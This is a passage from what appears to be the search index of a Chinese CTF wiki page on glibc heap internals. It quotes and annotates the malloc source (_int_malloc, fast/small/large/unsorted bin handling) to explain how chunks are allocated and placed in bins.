before. */ if ( ! victim && ar_ptr != NULL ) { LIBC_PROBE ( memory_malloc_retry , 1 , bytes ); ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || ar_ptr == arena_for_chunk ( mem2chunk ( victim ))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim ; }","title":"__libc_malloc"},{"location":"pwn/heap/heap_implementation_details/#_int_malloc","text":"_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684 \u5185\u5b58\u5757\u5927\u5c0f \u4ee5\u53ca \u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6 \uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002 static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ unsigned int idx ; /* associated bin index */ mbinptr bin ; /* associated bin */ mchunkptr victim ; /* inspected/selected chunk */ INTERNAL_SIZE_T size ; /* its size */ int victim_index ; /* its bin index */ mchunkptr remainder ; /* remainder from a split */ unsigned long remainder_size ; /* its size */ unsigned int block ; /* bit map traverser */ unsigned int bit ; /* bit map traverser */ unsigned int map ; /* current word of binmap */ mchunkptr fwd ; /* misc temp for linking */ mchunkptr bck ; /* misc temp for linking */ const char * errstr = NULL ; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size ( bytes , nb );","title":"_int_malloc"},{"location":"pwn/heap/heap_implementation_details/#arena","text":"/* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"arena"},{"location":"pwn/heap/heap_implementation_details/#fast-bin","text":"\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index ( nb ); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if ( victim != 0 ) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk ( av , victim , nb ); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"fast bin"},{"location":"pwn/heap/heap_implementation_details/#small-bin","text":"\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } }","title":"small bin"},{"location":"pwn/heap/heap_implementation_details/#large-bin","text":"\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index ( nb ); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); }","title":"large bin"},{"location":"pwn/heap/heap_implementation_details/#_7","text":"\u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u5c1d\u8bd5\u4ece top chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ;","title":"\u5927\u5faa\u73af"},{"location":"pwn/heap/heap_implementation_details/#unsort-bin","text":"\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim -> bk ; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize ( victim );","title":"unsort bin \u904d\u5386"},{"location":"pwn/heap/heap_implementation_details/#small-request","text":"\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb ; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset ( victim , nb ); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av -> last_remainder = remainder ; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot ( remainder , remainder_size ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"small request"},{"location":"pwn/heap/heap_implementation_details/#_8","text":"/* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av );","title":"\u521d\u59cb\u53d6\u51fa"},{"location":"pwn/heap/heap_implementation_details/#exact-fit","text":"\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; }","title":"exact fit"},{"location":"pwn/heap/heap_implementation_details/#place-chunk-in-small-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ;","title":"place chunk in small bin"},{"location":"pwn/heap/heap_implementation_details/#place-chunk-in-large-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 } else { // large bin\u8303\u56f4 victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // \u4ee4 fwd \u6307\u5411 bin \u5934 fwd = bck ; // \u4ee4 bck \u6307\u5411 bin \u5c3e bck = bck -> bk ; // victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk victim -> fd_nextsize = fwd -> fd ; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert ( chunk_main_arena ( fwd )); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim -> fd_nextsize = victim -> bk_nextsize = victim ; }","title":"place chunk in large bin"},{"location":"pwn/heap/heap_implementation_details/#_9","text":"// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk<-->victim<-->fwd\u3002 mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ;","title":"\u6700\u7ec8\u53d6\u51fa"},{"location":"pwn/heap/heap_implementation_details/#while","text":"while \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002 // ##define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; }","title":"while \u8fed\u4ee3\u6b21\u6570"},{"location":"pwn/heap/heap_implementation_details/#large-chunk","text":"\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // 